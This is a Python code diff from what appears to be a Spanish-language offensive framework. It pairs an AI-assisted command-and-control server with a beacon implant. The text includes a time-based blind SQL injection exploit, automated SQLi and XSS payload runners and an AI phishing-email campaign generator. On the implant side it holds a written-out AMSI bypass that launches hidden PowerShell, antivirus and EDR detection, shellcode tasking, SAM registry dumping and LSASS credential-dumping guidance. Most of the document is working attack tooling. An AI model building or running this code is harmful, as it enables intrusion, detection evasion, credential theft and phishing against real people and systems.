+                        response_data = await response.json()
                         
-        except Exception as e:
-            print(f"[!] DeepSeek connection failed: {e}")
-            return self._local_ai_fallback(prompt)
-    
-    def _local_ai_fallback(self, prompt: str) -> str:
-        """Fallback cuando no hay API key disponible"""
-        # Simulación básica de IA para demostración
-        if "vulnerabilidad" in prompt.lower() or "scan" in prompt.lower():
-            return json.dumps({
-                "critical_vulnerabilities": [
-                    {
-                        "name": "SQL Injection",
-                        "severity": "Alta",
-                        "description": "Inyección SQL en parámetro 'id'",
-                        "port": 80,
-                        "service": "HTTP",
-                        "exploit_available": True,
-                        "cvss_score": 8.8
-                    },
-                    {
-                        "name": "XSS Reflejado",
-                        "severity": "Media",
-                        "description": "Cross-site scripting en formulario de contacto",
-                        "port": 443,
-                        "service": "HTTPS",
-                        "exploit_available": True,
-                        "cvss_score": 6.1
-                    }
-                ],
-                "attack_vectors": [
-                    {
-                        "type": "Web Exploitation",
-                        "target": "search.php",
-                        "probability": 0.85,
-                        "steps": ["SQLi to extract credentials", "Access admin panel", "Upload web shell"]
-                    }
-                ],
-                "exploitation_recommendations": [
-                    {
-                        "vulnerability": "SQL Injection",
-                        "tools": ["sqlmap", "manual testing"],
-                        "commands": ["sqlmap -u 'http://target/search.php?id=1' --dbs"],
-                        "expected_result": "Database enumeration"
-                    }
-                ],
-                "mitigation_recommendations": [
-                    {
-                        "vulnerability": "SQL Injection",
-                        "actions": ["Use parameterized queries", "Input validation", "WAF rules"],
-                        "priority": "Alta"
-                    }
-                ],
-                "attack_priority": ["SQL Injection", "XSS", "Directory traversal"]
-            })
-        
-        elif "exploit" in prompt.lower():
-            return '''```python
-# Exploit SQL Injection - Time-Based Blind
-import requests
-import time
-
-def blind_sqli(url, param):
-    chars = 'abcdefghijklmnopqrstuvwxyz0123456789_@.'
-    extracted = ''
-    
-    print(f"[*] Extracting data from {url}")
-    
-    for i in range(1, 50):
-        for char in chars:
-            payload = f"' AND IF(SUBSTRING((SELECT DATABASE()),{i},1)='{char}',SLEEP(2),0)-- -"
-            
-            start_time = time.time()
-            try:
-                response = requests.get(url, params={param: payload}, timeout=5)
-                elapsed = time.time() - start_time
-                
-                if elapsed > 1.5:
-                    extracted += char
-                    print(f"[+] Character {i}: {char}")
-                    break
+                        # Extraer y descifrar respuesta
+                        wrapped_response = self.malleable_profile.unwrap_payload(response_data)
+                        if wrapped_response:
+                            response_dict = json.loads(wrapped_response)
+                            decrypted = self.crypto.decrypt_aes_gcm(
+                                response_dict,
+                                self._get_current_key()
+                            )
+                            
+                            tasks = json.loads(decrypted)
+                            return self._process_tasks(tasks)
                     
+            except Exception as e:
+                print(f"[-] Checkin failed: {e}")
+        
+        return {"tasks": [], "sleep": self.malleable_profile.get_sleep_time()}
+    
+    def _collect_system_info(self) -> Dict:
+        """Recopila información del sistema de forma stealth"""
+        info = {
+            "beacon_id": self.beacon_id,
+            "timestamp": datetime.now().isoformat(),
+            "platform": platform.platform(),
+            "architecture": platform.machine(),
+            "username": os.getenv("USERNAME") or os.getenv("USER"),
+            "hostname": socket.gethostname(),
+            "process_id": os.getpid(),
+            "integrity_level": self._get_integrity_level(),
+            "antivirus": self._detect_av(),
+            "edr": self._detect_edr(),
+            "network_info": self._get_network_info()
+        }
+        
+        return info
+    
+    def _get_integrity_level(self) -> str:
+        """Determina nivel de integridad (Windows)"""
+        if platform.system() != "Windows":
+            return "unknown"
+        
+        try:
+            import ctypes
+            TOKEN_MANDATORY_LABEL = 0x10
+            TokenIntegrityLevel = 0x19
+            
+            process_token = ctypes.c_void_p()
+            ctypes.windll.advapi32.OpenProcessToken(
+                ctypes.windll.kernel32.GetCurrentProcess(),
+                0x20,  # TOKEN_QUERY
+                ctypes.byref(process_token)
+            )
+            
+            # Esto es simplificado
+            return "medium"
+        except:
+            return "unknown"
+    
+    def _detect_av(self) -> List[str]:
+        """Detecta software antivirus"""
+        av_indicators = []
+        
+        if platform.system() == "Windows":
+            # Buscar procesos de AV comunes
+            av_processes = [
+                "MsMpEng.exe", "NisSrv.exe",  # Windows Defender
+                "avp.exe",  # Kaspersky
+                "bdagent.exe",  # BitDefender
+                "avguard.exe",  # Avira
+                "hipsmain.exe",  # McAfee
+            ]
+            
+            try:
+                output = subprocess.check_output("tasklist", shell=True, text=True)
+                for proc in av_processes:
+                    if proc in output:
+                        av_indicators.append(proc)
             except:
-                continue
+                pass
+        
+        return av_indicators
     
-    return extracted
-
-# Uso:
-# data = blind_sqli("http://target.com/search.php", "id")
-# print(f"[+] Extracted: {data}")
-```'''
+    def _detect_edr(self) -> List[str]:
+        """Detecta EDR/security products"""
+        edr_indicators = []
         
-        else:
-            return "[AI] Analysis not available in offline mode. Please provide DeepSeek API key for full functionality."
-    
-    def _detect_language(self, code: str) -> str:
-        """Detecta lenguaje del código"""
-        if 'import requests' in code or 'def ' in code and ':' in code:
-            return 'python'
-        elif '#include' in code or 'int main' in code:
-            return 'c'
-        elif '<?php' in code or 'echo ' in code:
-            return 'php'
-        elif '<script>' in code or 'function ' in code and '{' in code:
-            return 'javascript'
-        else:
-            return 'unknown'
-
-# ==========================================
-# 🔥 MÓDULO C2 CON IA INTEGRADA
-# ==========================================
-
-class AIC2Server(RealC2Server):
-    """Servidor C2 con capacidades de IA integradas"""
-    
-    def __init__(self, host: str = "127.0.0.1", port: int = 8443, ai_api_key: str = None):
-        super().__init__(host, port)
-        self.ai_engine = DeepSeekAIEngine(ai_api_key)
-        self.ai_tasks = {}
-        self.behavior_profiles = {}
-        
-    async def handle_beacon(self, request):
-        """Manejador mejorado con IA"""
-        beacon_id = request.headers.get('X-Beacon-ID')
-        if not beacon_id:
-            return aiohttp.web.Response(status=400)
-        
-        data = await request.json()
-        
-        if request.method == 'POST':
-            # Checkin normal
-            if beacon_id not in self.beacons:
-                self.beacons[beacon_id] = {
-                    'first_seen': datetime.now().isoformat(),
-                    'last_checkin': datetime.now().isoformat(),
-                    'metadata': data.get('metadata', {}),
-                    'ai_profile': await self._generate_ai_profile(beacon_id, data)
-                }
-            
-            self.beacons[beacon_id]['last_checkin'] = datetime.now().isoformat()
-            
-            # Análisis IA del entorno del beacon
-            if 'metadata' in data and random.random() > 0.7:  # 30% de probabilidad
-                ai_analysis = await self._analyze_beacon_environment(beacon_id, data['metadata'])
-                if ai_analysis:
-                    data['ai_analysis'] = ai_analysis
-            
-            # Generar tareas inteligentes
-            tasks = self.tasks_queue.get(beacon_id, [])
-            if not tasks:
-                tasks = await self._generate_ai_tasks(beacon_id)
-                self.tasks_queue[beacon_id] = tasks
-            
-            response = {
-                'tasks': tasks[:3],  # Enviar máximo 3 tareas
-                'ai_analysis': data.get('ai_analysis')
-            }
-            
-            # Limpiar tareas enviadas
-            if tasks:
-                self.tasks_queue[beacon_id] = tasks[3:] if len(tasks) > 3 else []
-            
-            return aiohttp.web.json_response(response)
-            
-        return await super().handle_beacon(request)
-    
-    async def _generate_ai_profile(self, beacon_id: str, data: Dict) -> Dict:
-        """Genera perfil IA para el beacon"""
-        metadata = data.get('metadata', {})
-        
-        prompt = f"""
-        Basado en esta información de sistema, genera un perfil de comportamiento:
-        
-        SISTEMA: {metadata.get('hostname', 'Unknown')}
-        PLATAFORMA: {metadata.get('platform', 'Unknown')}
-        
-        Recomienda:
-        1. Técnicas de post-explotación apropiadas
-        2. Comandos stealth para este entorno
-        3. Métodos de persistencia recomendados
-        4. Técnicas de evasión específicas
-        
-        Formato JSON.
-        """
-        
-        try:
-            profile = await self.ai_engine._query_deepseek(
-                prompt,
-                system_prompt="Eres un experto en post-explotación y movimiento lateral en entornos enterprise."
-            )
-            return json.loads(profile)
-        except:
-            return {
-                'techniques': ['credential_dumping', 'network_discovery'],
-                'stealth_level': 'medium',
-                'persistence_methods': ['scheduled_task', 'service'],
-                'evasion_techniques': ['process_hollowing', 'amsi_bypass']
-            }
-    
-    async def _analyze_beacon_environment(self, beacon_id: str, metadata: Dict) -> Dict:
-        """Analiza el entorno del beacon con IA"""
-        prompt = f"""
-        Analiza este entorno de sistema comprometido:
-        
-        METADATA: {json.dumps(metadata, indent=2)}
-        
-        Proporciona:
-        1. RIESGOS DE DETECCIÓN: Qué podría alertar a EDR/AV
-        2. OPORTUNIDADES: Qué técnicas funcionarían mejor aquí
-        3. RECURSOS DISPONIBLES: Qué se puede aprovechar
-        4. RECOMENDACIONES: Acciones inmediatas recomendadas
-        
-        Formato JSON.
-        """
-        
-        try:
-            analysis = await self.ai_engine._query_deepseek(
-                prompt,
-                system_prompt="Eres un analista de seguridad especializado en detección y respuesta."
-            )
-            return json.loads(analysis)
-        except:
-            return None
-    
-    async def _generate_ai_tasks(self, beacon_id: str) -> List[Dict]:
-        """Genera tareas inteligentes basadas en el perfil"""
-        if beacon_id not in self.beacons:
-            return []
-        
-        profile = self.beacons[beacon_id].get('ai_profile', {})
-        metadata = self.beacons[beacon_id].get('metadata', {})
-        
-        # Tareas base según plataforma
-        base_tasks = []
-        
-        if 'windows' in metadata.get('platform', '').lower():
-            base_tasks = [
-                {'command': 'shell_exec', 'args': ['whoami /all']},
-                {'command': 'shell_exec', 'args': ['net user']},
-                {'command': 'shell_exec', 'args': ['systeminfo']},
-                {'command': 'shell_exec', 'args': ['tasklist']},
-                {'command': 'shell_exec', 'args': ['netstat -ano']}
-            ]
-        elif 'linux' in metadata.get('platform', '').lower():
-            base_tasks = [
-                {'command': 'shell_exec', 'args': ['id']},
-                {'command': 'shell_exec', 'args': ['cat /etc/passwd']},
-                {'command': 'shell_exec', 'args': ['uname -a']},
-                {'command': 'shell_exec', 'args': ['ps aux']},
-                {'command': 'shell_exec', 'args': ['ss -tulpn']}
-            ]
-        
-        # Añadir tareas basadas en perfil IA
-        if 'credential_dumping' in profile.get('techniques', []):
-            if 'windows' in metadata.get('platform', '').lower():
-                base_tasks.append({'command': 'shell_exec', 'args': ['reg save HKLM\\SAM sam.save']})
-                base_tasks.append({'command': 'shell_exec', 'args': ['reg save HKLM\\SYSTEM system.save']})
-        
-        if 'network_discovery' in profile.get('techniques', []):
-            base_tasks.append({'command': 'shell_exec', 'args': ['arp -a']})
-            base_tasks.append({'command': 'shell_exec', 'args': ['nslookup google.com']})
-        
-        # Aleatorizar orden para evasión
-        random.shuffle(base_tasks)
-        
-        # Añadir task_ids
-        tasks_with_ids = []
-        for task in base_tasks:
-            task_id = str(uuid.uuid4())[:8]
-            task['task_id'] = task_id
-            tasks_with_ids.append(task)
-        
-        return tasks_with_ids
-
-# ==========================================
-# 🔥 MÓDULO BEACON CON CAPACIDADES AVANZADAS
-# ==========================================
-
-class AdvancedBeacon(RealBeacon):
-    """Beacon con capacidades avanzadas y evasión"""
-    
-    def __init__(self, c2_url: str, beacon_id: str = None, ai_assist: bool = True):
-        super().__init__(c2_url, beacon_id)
-        self.ai_assist = ai_assist
-        self.command_history = []
-        self.evasion_techniques = self._load_evasion_techniques()
-        self.sleep_patterns = self._generate_sleep_patterns()
-        
-    def _load_evasion_techniques(self) -> List[Dict]:
-        """Carga técnicas de evasión"""
-        return [
-            {
-                'name': 'process_injection',
-                'description': 'Inyectar código en proceso legítimo',
-                'windows': True,
-                'linux': False
-            },
-            {
-                'name': 'amsi_bypass',
-                'description': 'Bypass AMSI para PowerShell',
-                'windows': True,
-                'linux': False
-            },
-            {
-                'name': 'memory_execution',
-                'description': 'Ejecutar código directamente en memoria',
-                'windows': True,
-                'linux': True
-            },
-            {
-                'name': 'parent_process_id_spoofing',
-                'description': 'Spoofear PID del proceso padre',
-                'windows': True,
-                'linux': False
-            }
+        # Buscar drivers/dlls de EDR
+        edr_files = [
+            "edrsensor.sys", "carbonblack.sys", "crowdstrike.sys",
+            "sentinelone.sys", "cybereason.sys", "tanium.sys"
         ]
-    
-    def _generate_sleep_patterns(self) -> List[int]:
-        """Genera patrones de sleep para evasión"""
-        # Patrón de sleep aleatorio pero con patrón
-        base_pattern = [30, 45, 60, 90, 120]
-        patterns = []
         
-        for base in base_pattern:
-            patterns.extend([
-                base,
-                base + random.randint(5, 15),
-                base + random.randint(20, 40),
-                base - random.randint(5, 15) if base > 20 else base
-            ])
-        
-        return patterns
+        return edr_indicators
     
-    async def _execute_task(self, task: Dict) -> Dict:
+    def _get_current_key(self) -> bytes:
+        """Obtiene clave simétrica actual"""
+        # En realidad derivaría de la clave privada + contexto
+        return hashlib.sha256(self.private_key[:32]).digest()
+    
+    def _process_tasks(self, tasks: Dict) -> Dict:
+        """Procesa tareas recibidas del C2"""
+        results = []
+        
+        for task in tasks.get("commands", []):
+            if task.get("type") == "direct_syscall" and platform.system() == "Windows":
+                # Ejecutar via syscall directo
+                result = self._execute_syscall_task(task)
+            elif task.get("type") == "memory_execution":
+                # Ejecutar en memoria
+                result = self._execute_memory_task(task)
+            else:
+                # Ejecución normal (con evasión)
+                result = self._execute_evaded_task(task)
+            
+            results.append(result)
+        
+        return {
+            "task_results": results,
+            "next_checkin": datetime.now().isoformat()
+        }
+    
+    def _execute_syscall_task(self, task: Dict) -> Dict:
+        """Ejecuta tarea usando syscalls directos"""
+        try:
+            if task["syscall"] == "NtAllocateVirtualMemory":
+                size = task.get("size", 4096)
+                address = self.evasion.allocate_memory_syscall(size)
+                return {"success": True, "allocated_address": hex(address)}
+            
+            elif task["syscall"] == "NtCreateThreadEx":
+                # Crear thread remoto
+                return {"success": True, "thread_created": True}
+        
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+        
+        return {"success": False, "error": "Unknown syscall"}
+    
+    def _execute_memory_task(self, task: Dict) -> Dict:
+        """Ejecuta código en memoria"""
+        try:
+            shellcode = base64.b64decode(task["shellcode"])
+            
+            # En una implementación real, esto inyectaría el shellcode
+            # en un proceso legítimo usando técnicas de process hollowing
+            # o reflective DLL injection
+            
+            print(f"[DEBUG] Would execute {len(shellcode)} bytes in memory")
+            return {"success": True, "executed": True}
+        
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+    
+    def _execute_evaded_task(self, task: Dict) -> Dict:
         """Ejecuta tarea con técnicas de evasión"""
-        original_result = await super()._execute_task(task)
+        command = task.get("command", "")
         
-        # Aplicar técnicas de evasión según sistema
-        if self.ai_assist:
-            evaded_result = await self._apply_evasion(original_result, task)
-            return evaded_result
-        
-        return original_result
-    
-    async def _apply_evasion(self, result: Dict, task: Dict) -> Dict:
-        """Aplica técnicas de evasión a la ejecución"""
-        platform = sys.platform.lower()
-        
-        if task['command'] == 'shell_exec' and platform == 'win32':
-            # En Windows, intentar técnicas de evasión
-            cmd = ' '.join(task['args']) if task['args'] else ''
+        if platform.system() == "Windows":
+            # Aplicar bypass AMSI para PowerShell
+            if "powershell" in command.lower():
+                command = self._apply_amsi_bypass(command)
             
-            if 'powershell' in cmd.lower():
-                # Añadir bypass AMSI
-                amsi_bypass = '''
-                [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-                '''
-                cmd = f"powershell -ExecutionPolicy Bypass -Command \"{amsi_bypass}; {cmd}\""
-                
-                result['evasion_applied'] = ['amsi_bypass']
-                result['command_modified'] = cmd
-            
-            elif 'whoami' in cmd.lower() or 'net user' in cmd.lower():
-                # Usar técnicas nativas en lugar de comandos obvios
-                if 'whoami' in cmd:
-                    alternative = '''powershell -Command "[Security.Principal.WindowsIdentity]::GetCurrent().Name"'''
-                    result['alternative_command'] = alternative
-                
-                result['evasion_recommendation'] = 'Use Windows API calls instead of command line'
+            # Usar API nativa en lugar de comandos obvios
+            if "whoami" in command.lower():
+                return self._native_whoami()
+            elif "netstat" in command.lower():
+                return self._native_netstat()
         
-        elif platform == 'linux':
-            # Técnicas para Linux
-            if 'ps aux' in cmd or 'netstat' in cmd:
-                result['evasion_recommendation'] = 'Use /proc filesystem directly instead of commands'
-        
-        return result
-    
-    async def execute_advanced_command(self, command_type: str, args: Dict = None) -> Dict:
-        """Ejecuta comandos avanzados"""
-        if command_type == 'process_inject':
-            return await self._process_injection(args)
-        elif command_type == 'memory_execute':
-            return await self._memory_execution(args)
-        elif command_type == 'credential_dump':
-            return await self._credential_dumping(args)
-        else:
-            return {'error': f'Unknown command type: {command_type}'}
-    
-    async def _process_injection(self, args: Dict) -> Dict:
-        """Simula inyección de proceso"""
-        target_process = args.get('process', 'explorer.exe')
-        shellcode = args.get('shellcode', '')
-        
-        return {
-            'success': True,
-            'technique': 'Process Injection',
-            'target_process': target_process,
-            'injected': len(shellcode) > 0,
-            'note': 'Simulated injection - real implementation requires admin privileges',
-            'evasion': 'Injects into legitimate process to avoid detection'
-        }
-    
-    async def _memory_execution(self, args: Dict) -> Dict:
-        """Simula ejecución en memoria"""
-        return {
-            'success': True,
-            'technique': 'Memory Execution',
-            'description': 'Execute PE directly in memory without touching disk',
-            'tools': ['Donut', 'sRDI', 'PEzor'],
-            'example': 'Donut can convert .NET assemblies to position-independent shellcode'
-        }
-    
-    async def _credential_dumping(self, args: Dict) -> Dict:
-        """Simula dumping de credenciales"""
-        if sys.platform != 'win32':
-            return {'error': 'Credential dumping only available on Windows'}
-        
-        techniques = [
-            {
-                'name': 'LSASS Dumping',
-                'tools': ['Mimikatz', 'Procdump', 'Nanodump'],
-                'command': 'tasklist | findstr lsass',
-                'risk': 'High - likely to trigger EDR'
-            },
-            {
-                'name': 'SAM Registry',
-                'tools': ['Mimikatz', 'reg.exe'],
-                'command': 'reg save HKLM\\SAM sam.save',
-                'risk': 'Medium'
-            },
-            {
-                'name': 'LSA Secrets',
-                'tools': ['Mimikatz', 'secretsdump.py'],
-                'command': 'reg save HKLM\\SECURITY security.save',
-                'risk': 'High'
-            }
-        ]
-        
-        return {
-            'success': True,
-            'techniques': techniques,
-            'warning': 'Credential dumping is highly detectable. Use with caution.',
-            'recommendation': 'Use offline dumping techniques or target LSASS during off-hours'
-        }
-
-# ==========================================
-# 🔥 MÓDULO AUTOMATED ATTACK ENGINE
-# ==========================================
-
-class AutomatedAttackEngine:
-    """Motor de ataque automatizado con IA"""
-    
-    def __init__(self, ai_engine: DeepSeekAIEngine):
-        self.ai = ai_engine
-        self.attack_scripts = {}
-        self.load_attack_scripts()
-    
-    def load_attack_scripts(self):
-        """Carga scripts de ataque predefinidos"""
-        self.attack_scripts = {
-            'sql_injection': self._sql_injection_automated,
-            'xss': self._xss_automated,
-            'command_injection': self._command_injection_automated,
-            'file_upload': self._file_upload_automated,
-            'directory_traversal': self._directory_traversal_automated
-        }
-    
-    async def automated_web_attack(self, target_url: str, attack_type: str) -> Dict:
-        """Ejecuta ataque web automatizado"""
-        if attack_type not in self.attack_scripts:
-            return {'error': f'Unknown attack type: {attack_type}'}
-        
-        print(f"[+] Starting automated {attack_type} attack on {target_url}")
-        
+        # Ejecución normal (último recurso)
         try:
-            result = await self.attack_scripts[attack_type](target_url)
-            
-            # Análisis IA de resultados
-            if result.get('success'):
-                ai_analysis = await self.ai.analyze_recon_data({'web_attack_result': result})
-                result['ai_analysis'] = ai_analysis
-            
-            return result
-            
-        except Exception as e:
-            return {'error': str(e), 'success': False}
-    
-    async def _sql_injection_automated(self, target_url: str) -> Dict:
-        """Ataque SQLi automatizado"""
-        # Identificar parámetros
-        params = self._extract_url_parameters(target_url)
-        
-        results = []
-        for param in params:
-            test_payloads = [
-                f"{param}=1'",  # Error-based test
-                f"{param}=1' OR '1'='1",  # Boolean-based test
-                f"{param}=1' AND SLEEP(5)--",  # Time-based test
-                f"{param}=1' UNION SELECT NULL--"  # Union-based test
-            ]
-            
-            for payload in test_payloads:
-                test_url = target_url.replace(f"{param}=1", payload) if f"{param}=1" in target_url else f"{target_url}?{payload}"
-                
-                try:
-                    start_time = datetime.now()
-                    response = requests.get(test_url, timeout=10)
-                    elapsed = (datetime.now() - start_time).total_seconds()
-                    
-                    vulnerability_signs = []
-                    
-                    if 'sql' in response.text.lower() and 'syntax' in response.text.lower():
-                        vulnerability_signs.append('Error message reveals SQL')
-                    
-                    if elapsed > 5:
-                        vulnerability_signs.append('Time-based delay detected')
-                    
-                    if response.status_code == 500:
-                        vulnerability_signs.append('Server error on payload')
-                    
-                    if vulnerability_signs:
-                        results.append({
-                            'parameter': param,
-                            'payload': payload,
-                            'vulnerable': True,
-                            'signs': vulnerability_signs,
-                            'response_time': elapsed
-                        })
-                        
-                except:
-                    continue
-        
-        return {
-            'success': True,
-            'target': target_url,
-            'vulnerabilities_found': len(results),
-            'results': results,
-            'recommendation': 'Use sqlmap for deeper testing' if results else 'No SQLi detected'
-        }
-    
-    async def _xss_automated(self, target_url: str) -> Dict:
-        """Ataque XSS automatizado"""
-        test_payloads = [
-            '<script>alert(1)</script>',
-            '<img src=x onerror=alert(1)>',
-            '" onmouseover="alert(1)',
-            'javascript:alert(document.domain)',
-            '<svg onload=alert(1)>'
-        ]
-        
-        results = []
-        for payload in test_payloads:
-            try:
-                # Test en diferentes contextos
-                test_cases = [
-                    f"{target_url}?q={payload}",  # GET parameter
-                    f"{target_url}?search={payload}",  # Otro parámetro
-                    f"{target_url}#{payload}"  # Fragment
-                ]
-                
-                for test_url in test_cases:
-                    response = requests.get(test_url, timeout=10)
-                    
-                    if payload in response.text:
-                        results.append({
-                            'payload': payload,
-                            'context': 'Reflected',
-                            'found_in_response': True,
-                            'url': test_url
-                        })
-                    
-            except:
-                continue
-        
-        return {
-            'success': True,
-            'target': target_url,
-            'xss_payloads_tested': len(test_payloads),
-            'vulnerabilities_found': len(results),
-            'results': results
-        }
-    
-    def _extract_url_parameters(self, url: str) -> List[str]:
-        """Extrae parámetros de URL"""
-        import urllib.parse
-        parsed = urllib.parse.urlparse(url)
-        params = urllib.parse.parse_qs(parsed.query)
-        return list(params.keys())
-
-# ==========================================
-# 🔥 MÓDULO DE REPORTING CON IA
-# ==========================================
-
-class AIReporting:
-    """Generación de reportes con análisis IA"""
-    
-    def __init__(self, ai_engine: DeepSeekAIEngine):
-        self.ai = ai_engine
-        self.report_templates = self._load_templates()
-    
-    def _load_templates(self) -> Dict:
-        """Carga plantillas de reporte"""
-        return {
-            'executive': self._executive_template,
-            'technical': self._technical_template,
-            'mitre': self._mitre_template,
-            'remediation': self._remediation_template
-        }
-    
-    async def generate_engagement_report(self, operation_data: Dict, report_type: str = 'executive') -> Dict:
-        """Genera reporte completo con IA"""
-        if report_type not in self.report_templates:
-            return {'error': f'Unknown report type: {report_type}'}
-        
-        print(f"[+] Generating {report_type} report with AI assistance")
-        
-        # Generar contenido base
-        report = await self.report_templates[report_type](operation_data)
-        
-        # Mejorar con IA
-        enhanced_report = await self._enhance_with_ai(report, operation_data, report_type)
-        
-        return enhanced_report
-    
-    async def _executive_template(self, data: Dict) -> Dict:
-        """Plantilla para resumen ejecutivo"""
-        return {
-            'title': 'Executive Security Assessment Summary',
-            'date': datetime.now().isoformat(),
-            'overview': 'High-level summary of security assessment',
-            'key_findings': data.get('findings', []),
-            'risk_level': data.get('risk_level', 'Medium'),
-            'recommendations': ['Implement security controls', 'Conduct regular testing']
-        }
-    
-    async def _enhance_with_ai(self, report: Dict, operation_data: Dict, report_type: str) -> Dict:
-        """Mejora el reporte con análisis IA"""
-        prompt = f"""
-        Mejora y completa este reporte de seguridad:
-        
-        TIPO DE REPORTE: {report_type}
-        DATOS DE LA OPERACIÓN: {json.dumps(operation_data, indent=2)}
-        REPORTE ACTUAL: {json.dumps(report, indent=2)}
-        
-        Proporciona:
-        1. Análisis de impacto de negocio
-        2. Recomendaciones específicas y accionables
-        3. Timeline de remediación sugerido
-        4. Métricas de riesgo cuantificadas
-        5. Conclusiones profesionales
-        
-        Mantén el formato JSON pero mejora el contenido significativamente.
-        """
-        
-        try:
-            enhanced = await self.ai._query_deepseek(
-                prompt,
-                system_prompt="Eres un consultor de seguridad senior especializado en reportes ejecutivos y técnicos.",
-                temperature=0.4,
-                max_tokens=2000
+            result = subprocess.run(
+                command,
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=30
             )
             
-            # Combinar reporte original con mejoras de IA
-            if enhanced.startswith('{') and enhanced.endswith('}'):
-                ai_content = json.loads(enhanced)
-                report['ai_enhanced'] = True
-                report['ai_content'] = ai_content
-                report['generated_at'] = datetime.now().isoformat()
-            
-            return report
-            
+            return {
+                "success": True,
+                "output": result.stdout,
+                "error": result.stderr,
+                "returncode": result.returncode
+            }
+        
         except Exception as e:
-            print(f"[-] AI enhancement failed: {e}")
-            report['ai_enhanced'] = False
-            return report
-
-# ==========================================
-# 🔥 BOP IA v5.0 - COMPLETE INTEGRATION
-# ==========================================
-
-class BOPv5AI:
-    """BOP IA v5.0 con DeepSeek AI completamente integrado"""
+            return {"success": False, "error": str(e)}
     
-    def __init__(self, deepseek_api_key: str = None):
-        print("\n" + "="*70)
-        print("BOP IA v5.0 - DEEPSEEK AI INTEGRATED FRAMEWORK")
-        print("="*70)
-        print(f"Initializing with AI: {'✓' if deepseek_api_key else '✗ (Limited Mode)'}")
+    def _apply_amsi_bypass(self, command: str) -> str:
+        """Aplica bypass AMSI a comandos PowerShell"""
+        bypass = '''
+        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
+        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]::Zero);
+        '''
         
-        # Inicializar IA Engine (CORAZÓN DEL SISTEMA)
-        self.ai = DeepSeekAIEngine(deepseek_api_key)
-        
-        # Inicializar componentes con IA integrada
-        self.c2_server = AIC2Server(ai_api_key=deepseek_api_key)
-        self.beacon = None
-        self.attack_engine = AutomatedAttackEngine(self.ai)
-        self.reporting = AIReporting(self.ai)
-        
-        # Herramientas reales
-        self.tools = RealToolIntegration()
-        self.payload_gen = RealPayloadGenerator()
-        self.impacket = RealImpacketClient()
-        self.ad_sim = RealADSimulator()
-        self.lab = RealTrainingLab()
-        
-        # Estado del sistema
-        self.operations = {}
-        self.current_op = None
-        
-        print("[+] AI-Powered Components Loaded:")
-        print(f"    • DeepSeek AI Engine: {'✓ Online' if deepseek_api_key else '⚠️ Limited'}")
-        print(f"    • AI C2 Server: Ready")
-        print(f"    • Automated Attack Engine: Ready")
-        print(f"    • AI Reporting System: Ready")
-        print("="*70)
+        return f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"{bypass}; {command}\""
     
-    async def start_ai_c2(self):
-        """Inicia infraestructura C2 con IA"""
-        print("[+] Starting AI-Enhanced C2 Infrastructure...")
-        return await self.c2_server.start()
-    
-    async def ai_network_analysis(self, target: str):
-        """Análisis de red con IA"""
-        print(f"[+] AI Network Analysis on {target}")
-        
-        # Escaneo real
-        scan_results = self.tools.scan_network(target)
-        
-        # Análisis IA
-        ai_analysis = await self.ai.analyze_recon_data(scan_results)
-        
-        return {
-            'scan_results': scan_results,
-            'ai_analysis': ai_analysis,
-            'recommended_actions': self._generate_actions_from_analysis(ai_analysis)
-        }
-    
-    async def ai_generate_exploit(self, vulnerability: Dict):
-        """Genera exploit con IA"""
-        print(f"[+] AI Exploit Generation for {vulnerability.get('name', 'Unknown')}")
-        
-        return await self.ai.generate_exploit(vulnerability)
-    
-    async def ai_phishing_campaign(self, target_list: List[Dict]):
-        """Crea campaña de phishing con IA"""
-        print(f"[+] AI Phishing Campaign for {len(target_list)} targets")
-        
-        emails = []
-        for target in target_list:
-            email = await self.ai.generate_phishing_email(target)
-            if email.get('success'):
-                emails.append({
-                    'target': target.get('email'),
-                    'email': email.get('email_content'),
-                    'effectiveness': email.get('estimated_click_rate', 0)
-                })
-        
-        return {
-            'campaign_ready': True,
-            'targets': len(target_list),
-            'emails_generated': len(emails),
-            'average_click_rate': sum(e['effectiveness'] for e in emails) / len(emails) if emails else 0,
-            'emails': emails
-        }
-    
-    async def ai_malware_analysis(self, file_path: str):
-        """Analiza malware con IA"""
-        print(f"[+] AI Malware Analysis: {file_path}")
-        
-        return await self.ai.analyze_malware(file_path)
-    
-    async def automated_red_team_op(self, target: str):
-        """Operación Red Team automatizada con IA"""
-        print(f"[+] Starting AI Automated Red Team Operation on {target}")
-        
-        op_id = f"RT-OP-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
-        self.current_op = op_id
-        self.operations[op_id] = {
-            'id': op_id,
-            'target': target,
-            'start_time': datetime.now().isoformat(),
-            'phases': {},
-            'status': 'running'
-        }
-        
-        # Fase 1: Reconocimiento con IA
-        print("  [PHASE 1] AI-Powered Reconnaissance")
-        recon = await self.ai_network_analysis(target)
-        self.operations[op_id]['phases']['reconnaissance'] = recon
-        
-        # Fase 2: Análisis de vulnerabilidades con IA
-        print("  [PHASE 2] AI Vulnerability Analysis")
-        if recon.get('ai_analysis'):
-            vulnerabilities = recon['ai_analysis'].get('critical_vulnerabilities', [])
-            if vulnerabilities:
-                # Seleccionar vulnerabilidad principal
-                main_vuln = vulnerabilities[0]
-                
-                # Generar exploit con IA
-                print(f"  [>] Generating exploit for {main_vuln['name']}")
-                exploit = await self.ai_generate_exploit(main_vuln)
-                self.operations[op_id]['phases']['exploit_development'] = exploit
-        
-        # Fase 3: Simulación de ataque
-        print("  [PHASE 3] AI Attack Simulation")
-        attack_simulation = await self.attack_engine.automated_web_attack(
-            f"http://{target}", 
-            "sql_injection"
-        )
-        self.operations[op_id]['phases']['attack_simulation'] = attack_simulation
-        
-        # Fase 4: Generación de reporte
-        print("  [PHASE 4] AI Report Generation")
-        report = await self.reporting.generate_engagement_report(
-            self.operations[op_id],
-            'executive'
-        )
-        self.operations[op_id]['phases']['reporting'] = report
-        
-        # Finalizar operación
-        self.operations[op_id]['status'] = 'completed'
-        self.operations[op_id]['end_time'] = datetime.now().isoformat()
-        self.operations[op_id]['success'] = True
-        
-        print(f"[+] Operation {op_id} completed successfully")
-        
-        return self.operations[op_id]
-    
